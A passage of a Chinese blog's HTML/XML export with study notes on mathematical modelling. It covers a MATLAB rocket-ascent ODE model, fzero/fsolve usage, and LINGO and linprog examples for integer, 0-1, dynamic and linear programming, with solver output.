  <span class="hljs-number">2.379385045866726</span><br>   <span class="hljs-number">9.800000000000001</span>  <span class="hljs-number">12.049420139992524</span>   <span class="hljs-number">2.316643469274441</span><br>   <span class="hljs-number">9.899999999999999</span>  <span class="hljs-number">13.015307238019034</span>   <span class="hljs-number">2.259644421438928</span><br>  <span class="hljs-number">10.000000000000000</span>  <span class="hljs-number">14.066477981731850</span>   <span class="hljs-number">2.208374999040992</span><br>  <span class="hljs-number">10.100000000000000</span>  <span class="hljs-number">15.210166395628448</span>   <span class="hljs-number">2.162888744276744</span><br>  <span class="hljs-number">10.199999999999999</span>  <span class="hljs-number">16.454063734511507</span>   <span class="hljs-number">2.123305644857589</span><br>  <span class="hljs-number">10.300000000000001</span>  <span class="hljs-number">17.806318483488852</span>   <span class="hljs-number">2.089812134010228</span><br>  <span class="hljs-number">10.399999999999999</span>  <span class="hljs-number">19.275536357973380</span>   <span class="hljs-number">2.062661090476664</span><br>  <span class="hljs-number">10.500000000000000</span>  <span class="hljs-number">20.870780303683247</span>   <span class="hljs-number">2.042171838514192</span><br>  <span class="hljs-number">10.600000000000000</span>  <span class="hljs-number">22.601570496641628</span>   <span class="hljs-number">2.028730147895408</span><br>  <span class="hljs-number">10.699999999999999</span>  <span class="hljs-number">24.477884343176854</span>   <span class="hljs-number">2.022788233908206</span><br>  <span class="hljs-number">10.800000000000001</span>  <span class="hljs-number">26.510156479922557</span>   <span class="hljs-number">2.024864757355776</span><br>  <span class="hljs-number">10.899999999999999</span>  <span class="hljs-number">28.709278773817164</span>   <span class="hljs-number">2.035544824556605</span><br>  <span class="hljs-number">11.000000000000000</span>  <span class="hljs-number">31.084367983721659</span>   <span class="hljs-number">2.055829025420224</span><br>  <span class="hljs-number">11.100000000000000</span>  <span class="hljs-number">33.641600133885817</span>   <span class="hljs-number">2.087482853795129</span><br>  <span class="hljs-number">11.199999999999999</span>  <span class="hljs-number">36.398209815499314</span>   <span class="hljs-number">2.130849364961110</span><br>  <span class="hljs-number">11.300000000000001</span>  <span class="hljs-number">39.367967703938106</span>   <span class="hljs-number">2.186873814289113</span><br>  <span class="hljs-number">11.400000000000000</span>  <span class="hljs-number">42.559757627422172</span>   <span class="hljs-number">2.257313701026955</span><br>  <span class="hljs-number">11.500000000000000</span>  <span class="hljs-number">45.977576567015859</span>   <span class="hljs-number">2.344738768299329</span><br>  <span class="hljs-number">11.600000000000000</span>  <span class="hljs-number">49.620534656627697</span>   <span class="hljs-number">2.452531003107799</span><br>  <span class="hljs-number">11.699999999999999</span>  <span class="hljs-number">53.482855183010443</span>   <span class="hljs-number">2.584884636330803</span><br>  <span class="hljs-number">11.800000000000001</span>  <span class="hljs-number">57.553874585761008</span>   <span class="hljs-number">2.746806142723651</span><br>  <span class="hljs-number">11.900000000000000</span>  <span class="hljs-number">61.818042457320516</span>   <span class="hljs-number">2.944114240918524</span><br>  <span class="hljs-number">12.000000000000000</span>  <span class="hljs-number">66.254921542974230</span>   <span class="hljs-number">3.183439893424474</span><br>  <span class="hljs-number">12.100000000000000</span>  <span class="hljs-number">70.842835987138443</span>   <span class="hljs-number">3.469191596026587</span><br>  <span class="hljs-number">12.199999999999999</span>  <span class="hljs-number">75.522162277682469</span>   <span class="hljs-number">3.812925452239469</span><br>  <span class="hljs-number">12.300000000000001</span>  <span class="hljs-number">80.190042341363892</span>   <span class="hljs-number">4.234758224058336</span><br>  <span class="hljs-number">12.400000000000000</span>  <span class="hljs-number">84.721311371072218</span>   <span class="hljs-number">4.754536876029922</span><br>  <span class="hljs-number">12.500000000000000</span>  <span class="hljs-number">88.968565157515215</span>   <span class="hljs-number">5.391807215404708</span><br>  <span class="hljs-number">12.600000000000000</span>  <span class="hljs-number">92.762160089218654</span>   <span class="hljs-number">6.165813892136889</span><br>  <span class="hljs-number">12.699999999999999</span>  <span class="hljs-number">95.910213152526353</span>   <span class="hljs-number">7.095500398884376</span><br>  <span class="hljs-number">12.800000000000001</span>  <span class="hljs-number">98.198601931600223</span>   <span class="hljs-number">8.199509071008816</span><br>  <span class="hljs-number">12.900000000000000</span>  <span class="hljs-number">99.390964608420120</span>   <span class="hljs-number">9.496181086575533</span><br>  <span class="hljs-number">13.000000000000000</span>  <span class="hljs-number">99.228699962784120</span>  <span class="hljs-number">11.003556466353615</span><br>  <span class="hljs-number">13.100000000000000</span>  <span class="hljs-number">97.436046146590030</span>  <span class="hljs-number">12.738369650117397</span><br>  <span class="hljs-number">13.199999999999999</span>  <span class="hljs-number">93.897248393422203</span>  <span class="hljs-number">14.679124234884609</span><br>  <span class="hljs-number">13.300000000000001</span>  <span class="hljs-number">88.688453695875353</span>  <span class="hljs-number">16.763830256803850</span><br>  <span class="hljs-number">13.400000000000000</span>  <span class="hljs-number">82.012934272797054</span>  <span class="hljs-number">18.915104969188761</span><br>  <span class="hljs-number">13.500000000000000</span>  <span class="hljs-number">74.220377956306322</span>  <span class="hljs-number">21.037723489086446</span><br>  <span class="hljs-number">13.600000000000000</span>  <span class="hljs-number">65.797111775025812</span>  <span class="hljs-number">23.020131785390436</span><br>  <span class="hljs-number">13.699999999999999</span>  <span class="hljs-number">57.253976641417438</span>  <span class="hljs-number">24.761724756250914</span><br>  <span class="hljs-number">13.800000000000001</span>  <span class="hljs-number">49.023767724601868</span>  <span class="hljs-number">26.194780217083739</span><br>  <span class="hljs-number">13.900000000000000</span>  <span class="hljs-number">41.434244003664332</span>  <span class="hljs-number">27.279068723563903</span><br>  <span class="hljs-number">14.000000000000000</span>  <span class="hljs-number">34.706174448093314</span>  <span class="hljs-number">28.001620983792861</span><br>  <span class="hljs-number">14.100000000000000</span>  <span class="hljs-number">28.935101031065749</span>  <span class="hljs-number">28.380190468466417</span><br>  <span class="hljs-number">14.199999999999999</span>  <span class="hljs-number">24.065998570034740</span>  <span class="hljs-number">28.461020682665570</span><br>  <span class="hljs-number">14.300000000000001</span>  <span class="hljs-number">20.010527449455722</span>  <span class="hljs-number">28.291941938864412</span><br>  <span class="hljs-number">14.400000000000000</span>  <span class="hljs-number">16.675929778091504</span>  <span class="hljs-number">27.918123986722730</span><br>  <span class="hljs-number">14.500000000000000</span>  <span class="hljs-number">13.965024013772720</span>  <span class="hljs-number">27.382080322488665</span><br>  <span class="hljs-number">14.600000000000000</span>  <span class="hljs-number">11.774235192175343</span>  <span class="hljs-number">26.723934672852753</span><br>  <span class="hljs-number">14.699999999999999</span>   <span class="hljs-number">9.998177418711006</span>  <span class="hljs-number">25.978837203372350</span><br>  <span class="hljs-number">14.800000000000001</span>   <span class="hljs-number">8.554008385420849</span>  <span class="hljs-number">25.173646553167053</span><br>  <span class="hljs-number">14.900000000000000</span>   <span class="hljs-number">7.376179856212027</span>  <span class="hljs-number">24.330003419116061</span><br>  <span class="hljs-number">15.000000000000000</span>   <span class="hljs-number">6.415769580325549</span>  <span class="hljs-number">23.464512074444599</span><br></code></pre></td></tr></table></figure><h2 id="火箭升空模型"><a href="#火箭升空模型" class="headerlink" title="火箭升空模型"></a>火箭升空模型</h2><p>火箭模型复现之后发现与课本数据有少许误差,我认为是matlab版本以及计算精度造成的差异<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728724410-c33ec005-4a0c-436a-9be0-1c0d9053143d.png#align=left&display=inline&height=766&originHeight=766&originWidth=850&size=0&status=done&style=none&width=850"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs matlab">ts1 = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">60</span>;<br>ts2 = <span class="hljs-number">60</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">71.5</span>;<br>[t1,x1] = ode45(@(t,y)huojian1(t,y),ts1,[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]);<span class="hljs-comment">%第一阶段</span><br>[t2,x2] = ode45(@(t,y)huojian2(t,y),ts2,[x1(<span class="hljs-built_in">length</span>(x1),<span class="hljs-number">1</span>),x1(<span class="hljs-built_in">length</span>(x1),<span class="hljs-number">2</span>)]);<span class="hljs-comment">%第二阶段</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">plot</span>(t1,x1(:,<span class="hljs-number">1</span>),t2,x2(:,<span class="hljs-number">1</span>));<span class="hljs-comment">%速度图</span><br><span class="hljs-comment">%[t2,x2] = ode45(@huojian2,t2,[0 0]);</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">2</span>);<br><span class="hljs-comment">%画高度图</span><br><span class="hljs-built_in">plot</span>(t1,x1(:,<span class="hljs-number">2</span>),t2,x2(:,<span class="hljs-number">2</span>));<br><span class="hljs-comment">%画加速度图</span><br>a1 =diff(x1(:,<span class="hljs-number">1</span>));<br>s1 = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>,<span class="hljs-number">600</span>)&#x27;;<span class="hljs-comment">%由于前向差分的缘故数据点与横坐标差了1,因此做一个数据拟合</span><br>s2 = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">60</span>,<span class="hljs-number">71.5</span>,<span class="hljs-number">115</span>)&#x27;;<br>a11 = spline(s1,a1,t1);<br>a2 = diff(x2(:,<span class="hljs-number">1</span>));<br>a22 = spline(s2,a2,t2);<br><span class="hljs-built_in">figure</span>(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">plot</span>(t1,a11,t2,a22);grid on;<br>两阶段微分方程组<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dx</span> = <span class="hljs-title">huojian1</span><span class="hljs-params">(t,x)</span></span><br><span class="hljs-comment">%阶段一</span><br>M = <span class="hljs-number">1400</span>;m = <span class="hljs-number">18</span>;F = <span class="hljs-number">32000</span>;k = <span class="hljs-number">0.4</span>;g = <span class="hljs-number">9.8</span>;<br>dx = [(F-k*x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)*x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))/(M-m*t)-g;x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)];<br><span class="hljs-keyword">end</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dx</span> =<span class="hljs-title">huojian2</span><span class="hljs-params">(t,x)</span></span><br><span class="hljs-comment">%阶段二</span><br>k = <span class="hljs-number">0.4</span>;g = <span class="hljs-number">9.8</span>;M0=<span class="hljs-number">320</span>;<br>dx = [(-k*x(<span class="hljs-number">1</span>)*x(<span class="hljs-number">1</span>))/M0-g;x(<span class="hljs-number">1</span>)];<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_29831163/article/details/89702947">相关Blog</a><br>参考网址:<a href="https://blog.csdn.net/qq_29831163/article/details/89703911">https://blog.csdn.net/qq_29831163/article/details/89703911</a></p><p>$$</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微分方程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving-Nonlinear-equations-and-equations</title>
      <link href="/2020/Solving-Nonlinear-equations-and-equations/"/>
      <url>/2020/Solving-Nonlinear-equations-and-equations/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="解非线性方程和方程组"><a href="#解非线性方程和方程组" class="headerlink" title="解非线性方程和方程组"></a>解非线性方程和方程组</h1><h2 id="fzero-命令解三次方程"><a href="#fzero-命令解三次方程" class="headerlink" title="fzero 命令解三次方程"></a>fzero 命令解三次方程</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>语法<code>x = fzero(fun,x0)</code>, starts at x0 and tries to solve the equations fun(x) = 0(尝试求出 fun(x) = 0 的点 x。此解是 fun(x) 变号的位置 ) - fzero 无法求函数（例如 x^2）的根。<br><code>x = fzero(fun,x0,options)</code>使用 options 修改求解过程。</p><blockquote><p>例如 options = optimset(‘PlotFcns’,{@optimplotx,@optimplotfval});<br>Display 显示级别：</p><ul><li>‘off’ 不显示输出。</li></ul></blockquote><blockquote><ul><li>‘iter’ 在每次迭代时显示输出。</li></ul></blockquote><blockquote><ul><li>‘final’ 仅显示最终输出。</li></ul></blockquote><blockquote><ul><li>‘notify’（默认值）仅在函数未收敛时显示输出。</li></ul></blockquote><p><code>x = fzero(problem)</code>对 problem 指定的求根问题求解。<br><code>[x,fval,exitflag,output] = fzero(___)</code>返回详细结构体<br>例如<code>fzero(inline(&#39;x^3-2*x-5&#39;),0)</code></p><h2 id="fsovle-函数"><a href="#fsovle-函数" class="headerlink" title="fsovle 函数"></a>fsovle 函数</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><code>x = fsolve(fun,x0)``x = fsolve(fun,x0,options)``x = fsolve(problem)``[x,fval] = fsolve(___)``[x,fval,exitflag,output] = fsolve(___)``[x,fval,exitflag,output,jacobian] = fsolve(___)</code><br>大同小异</p><h3 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728570078-3007f645-0da9-44b1-be34-ce7474bedf15.png#align=left&display=inline&height=675&originHeight=675&originWidth=806&size=0&status=done&style=none&width=806"></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 非线性方程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Integer-programming</title>
      <link href="/2020/Integer-programming/"/>
      <url>/2020/Integer-programming/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="整数规划"><a href="#整数规划" class="headerlink" title="整数规划"></a>整数规划</h1><h2 id="线性规划-LP-问题"><a href="#线性规划-LP-问题" class="headerlink" title="线性规划 LP 问题"></a>线性规划 LP 问题</h2><blockquote><p>各变量可以是小数来逼近最值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>max 5*x1+8*x2;<br>x1+x2&lt;6;<br>5*x1+9*x2&lt;&#x3D;45;<br>end<br>输出<br> Objective value:             41.25000<br> X1        2.250000            0.000000<br> X2        3.750000            0.000000<br></code></pre></td></tr></table></figure><h2 id="整数规划-IP-松弛问题"><a href="#整数规划-IP-松弛问题" class="headerlink" title="整数规划 IP 松弛问题"></a>整数规划 IP 松弛问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>col&#x2F;1,2&#x2F;;<br>hh(col):x;<br>endsets<br>MAX &#x3D; 5*x(1)+8*x(2);<br>x(1)+x(2)&lt;6;<br>5*x(1)+9*x(2)&lt;&#x3D;45;<br>@for(col(j):@gin(x(j)));!这句话是限制变量为整数（gin）;<br>END<br>输出<br>Objective value:                              40.00000<br>Variable           Value        Reduced Cost<br>X( 1)        0.000000           -5.000000<br>X( 2)        5.000000           -8.000000<br></code></pre></td></tr></table></figure><h2 id="动态规划–最短路径"><a href="#动态规划–最短路径" class="headerlink" title="动态规划–最短路径"></a>动态规划–最短路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>citles&#x2F;1..9&#x2F;:L;<br>roads(citles,citles)&#x2F;<br>9,6,9,7,9,8<br>6,4,6,5,7,4,7,5,8,4,8,5<br>4,2,4,3,5,2,5,3<br>2,1,3,1&#x2F;:D;<br>endsets<br>data:<br>D&#x3D;<br>6 3 3<br>6 5 8 6 7 4<br>6 7 8 9<br>5 6;<br>enddata<br>L(1)&#x3D;0;<br>@for(citles(i)|i#GT#1:<br>L(i) &#x3D; @min(roads(i,j):D(i,j)+L(j)));<br>end<br>输出<br> Variable           Value<br>    L( 1)        0.000000<br>    L( 2)        5.000000<br>    L( 3)        6.000000<br>    L( 4)        11.00000<br>    L( 5)        13.00000<br>    L( 6)        17.00000<br>    L( 7)        19.00000<br>    L( 8)        17.00000<br>    L( 9)        20.00000<br>D( 9, 6)        6.000000<br>D( 9, 7)        3.000000<br>D( 9, 8)        3.000000<br>D( 6, 4)        6.000000<br>D( 6, 5)        5.000000<br>D( 7, 4)        8.000000<br>D( 7, 5)        6.000000<br>D( 8, 4)        7.000000<br>D( 8, 5)        4.000000<br>D( 4, 2)        6.000000<br>D( 4, 3)        7.000000<br>D( 5, 2)        8.000000<br>D( 5, 3)        9.000000<br>D( 2, 1)        5.000000<br>D( 3, 1)        6.000000<br></code></pre></td></tr></table></figure><ol><li>所有函数均以@开头</li><li>citles 表示从 1~9 组成的集合，属性 L(i)表示最优行驶路线长</li><li>集合循环语句#GT#表示逻辑关系大于</li><li>L(i) = @min(roads(i,j):D(i,j)+L(j)))即为动态规划基本方程</li></ol><h2 id="选课模型–0-1-规划"><a href="#选课模型–0-1-规划" class="headerlink" title="选课模型–0-1 规划"></a>选课模型–0-1 规划</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>Shuliang&#x2F;1..18&#x2F;:m;<br>Xuanke(Shuliang):x;<br>endsets<br>data:<br>m &#x3D; 5,5,4,4,3,3,3,2,3,3,3,2,2,2,2,1,1,1;<br>enddata<br>min&#x3D;@sum(Xuanke(i):x(i));<br>@for(Xuanke(k):@bin(x(k)));<br>@sum(Xuanke(i):m(i)*x(i))&gt;&#x3D;18;<br>@sum(Xuanke(j)|j#ge#9#and#j#le#18:m(j)*x(j))&lt;&#x3D;@sum(Xuanke(i):m(i)*x(i))&#x2F;3;!j大于9小于18，i的范围为1~18<br>@sum(Xuanke(j)|j#ge#9#and#j#le#18:m(j)*x(j))&gt;&#x3D;@sum(Xuanke(i):m(i)*x(i))&#x2F;6;<br>x(1)&gt;&#x3D;x(5);<br>x(2)&gt;&#x3D;x(7);<br>x(8)&gt;&#x3D;x(9);<br>x(6)&gt;&#x3D;x(10);<br>x(4)&gt;&#x3D;x(11);<br>x(5)&gt;&#x3D;x(12);<br>x(7)&gt;&#x3D;x(13);<br>x(6)&gt;&#x3D;x(14);<br>end<br>输出<br>Objective value:                              5.000000<br>X( 1)        1.000000            1.000000<br>X( 2)        1.000000            1.000000<br>X( 3)        0.000000            1.000000<br>X( 4)        1.000000            1.000000<br>X( 5)        0.000000            1.000000<br>X( 6)        0.000000            1.000000<br>X( 7)        0.000000            1.000000<br>X( 8)        0.000000            1.000000<br>X( 9)        0.000000            1.000000<br>X( 10)        0.000000            1.000000<br>X( 11)        1.000000            1.000000<br>X( 12)        0.000000            1.000000<br>X( 13)        0.000000            1.000000<br>X( 14)        0.000000            1.000000<br>X( 15)        1.000000            1.000000<br>X( 16)        0.000000            1.000000<br>X( 17)        0.000000            1.000000<br>X( 18)        0.000000            1.000000<br></code></pre></td></tr></table></figure><p>由此得出选课方案，一共选 5 门，为 x 矩阵中为 1 的变量。<br>这里发现了 Lingo 的一个非常棒的检查代码的功能！<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728163727-676d1a88-4879-4aef-aa34-4c66cf99f470.png#align=left&display=inline&height=523&originHeight=523&originWidth=1014&size=0&status=done&style=none&width=1014">就是模型编译！它可以直接把代码翻译成数学公式，如图<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728164253-96254c1f-96d1-44bc-a9c1-919c9ef00301.png#align=left&display=inline&height=636&originHeight=636&originWidth=795&size=0&status=done&style=none&width=795"> 简直神器！！这样就可以看看翻译成的式子是不是自己想要的从而检查代码哪里写错了！点赞 👍</p><h2 id="连续规划-–石油购买"><a href="#连续规划-–石油购买" class="headerlink" title="连续规划 –石油购买"></a>连续规划 –石油购买</h2><p>这里遇到一种新情况，即分段规划，比如：当购买量不超过 500 吨时，单价 10000 元；当购买量超过 500 吨但不超过 1000 吨，超过的部分 8000 元，当超过 1000 吨但不超过 1500 吨，超过的部分 6000 元。<br>这里有多种方法可以实现。<br><strong>第一种–巧用 if 语句</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>buy&#x2F;1,2,3&#x2F;:r;<br>nums&#x2F;1,2&#x2F;;<br>goods(nums):x;<br>endsets<br>max &#x3D; 4800*x(1)+5600*x(2)-10000*r(1)-8000*r(2)-6000*r(3);<br>0.5*x(1)+0.6*x(2)&lt;&#x3D;500+r(1)+r(2)+r(3);<br>0.5*x(1)+0.4*x(2)&lt;&#x3D;1000;<br>r(1)&lt;&#x3D;500;<br>r(3)&lt;&#x3D;500;<br>r(2)&lt;&#x3D;500;<br>r(2)&#x3D;@if(r(1)#lt#500,0,r(2));!由于@if语句第一个是判断条件，第二个是为真时的值，第三个是为假的值，而这里必须是个数而不能表示成&lt;&#x3D;500，因此让它等于自身;<br>r(3)&#x3D;@if(r(2)#lt#500,0,r(3));<br>end<br></code></pre></td></tr></table></figure><p><strong>第二种–引入 0-1 变量，转换成线性约束</strong><br>这里约定，为第一阶段购买原油吨，为第二阶段，为第三阶段,表示是否购买.<br>核心代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">x1-500*y1&lt;&#x3D;0;<br>x2-500*y2&lt;&#x3D;0;<br>x3-500*y3&lt;&#x3D;0;<br>x1-500*y2&gt;&#x3D;0;<br>x2-500*y3&gt;&#x3D;0;<br>@bin(y1);<br>@bin(y3);<br>@bin(y2);<br>得到方案<br>Variable           Value        Reduced Cost<br>R( 1)        500.0000            0.000000<br>R( 2)        500.0000            0.000000<br>R( 3)        0.000000            6000.000<br>X( 1)        0.000000            2200.000<br>X( 2)        2500.000            0.000000<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lingo </tag>
            
            <tag> 整数规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Constraint-Optimization</title>
      <link href="/2020/Constraint-Optimization/"/>
      <url>/2020/Constraint-Optimization/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="约束优化"><a href="#约束优化" class="headerlink" title="约束优化"></a>约束优化</h1><p>matlab 有几种命令可以求解</p><ul><li><p><code>linprog</code>求一次线性规划</p></li><li><p><code>quadprog</code>求二次规划问题</p></li></ul><blockquote><p>书上的方法是将二次规划问题改写成极小化标准形式，获得二次型黑塞矩阵（我没看懂），留一个坑<br>黑塞矩阵：是一个多元函数的二阶偏导数构成的方阵，描述了函数的局部曲率。</p></blockquote><p>一些概念重温<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599727899744-ea5ecfba-8939-4123-ad2d-4b184dd8fd61.png#align=left&display=inline&height=240&originHeight=240&originWidth=553&size=0&status=done&style=none&width=553"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599727899696-595c2346-2f07-4865-b9ab-f3f5bfda9e63.png#align=left&display=inline&height=705&originHeight=705&originWidth=930&size=0&status=done&style=none&width=930"><br>黑塞矩阵说白了应该就是对每个变量分别求两次偏导得到的对称正定矩阵。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599727898787-641f0c87-8344-4f35-8e18-079894f66db9.png#align=left&display=inline&height=336&originHeight=336&originWidth=734&size=0&status=done&style=none&width=734"></p><h2 id="linprog语法"><a href="#linprog语法" class="headerlink" title="linprog语法"></a><code>linprog</code>语法</h2><p><code>x = linprog(f,A,b)``x = linprog(f,A,b,Aeq,beq)``x = linprog(f,A,b,Aeq,beq,lb,ub)``x = linprog(f,A,b,Aeq,beq,lb,ub,options)``x = linprog(problem)``[x,fval] = linprog(___)``[x,fval,exitflag,output] = linprog(___)``[x,fval,exitflag,output,lambda] = linprog(___)</code></p><h3 id="详细描述"><a href="#详细描述" class="headerlink" title="详细描述"></a>详细描述</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599727899519-8ce7a1aa-7905-4f47-a746-34ab1e94a4b4.png#align=left&display=inline&height=220&originHeight=220&originWidth=527&size=0&status=done&style=none&width=527"></p><h3 id="生产销售规划"><a href="#生产销售规划" class="headerlink" title="生产销售规划"></a>生产销售规划</h3><p>%可以直接把系数及约束条件都直接用矩阵表示而不是再写一个函数<br>c = [12 8 22-1.5/0.8 16-1.5/0.75];<br>A = [1/3 1/4 1/2.4 1/3;4 2 6/0.8 16/3;1 0 1/0.8 0];<br>b = [50;480;100];<br>v1 = [0,0,0,0];<br>[x,fval] = linprog(-c,A,b,[],[],v1);<br>对应的式子就不写了…不过在设变量的时候尽量设多一点，否则有些量之间存在因果关系的在约束的时候有可能考虑不周。<br>灵敏度分析，则 LINGO 还会输出以下结果：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs matlab">RANGES IN WHICH THE BASIS IS UNCHANGED:<br><br> OBJCOEFFICIENTRANGES  VARIABLE      CURRENT                ALLOWABLE          ALLOWABLE<br><br>                     COEF           INCREASE         DECREASE<br><br>       X1           <span class="hljs-number">72.000000</span>         <span class="hljs-number">24.000000</span>            <span class="hljs-number">8.000000</span><br><br>       X2           <span class="hljs-number">64.000000</span>          <span class="hljs-number">8.000000</span>           <span class="hljs-number">16.000000</span><br><br>                           RIGHTHANDSIDERANGES<br><br>      ROW        CURRENT        ALLOWABLE       ALLOWABLE<br><br>                     RHS            INCREASE         DECREASE<br><br>        <span class="hljs-number">2</span>            <span class="hljs-number">50.000000</span>         <span 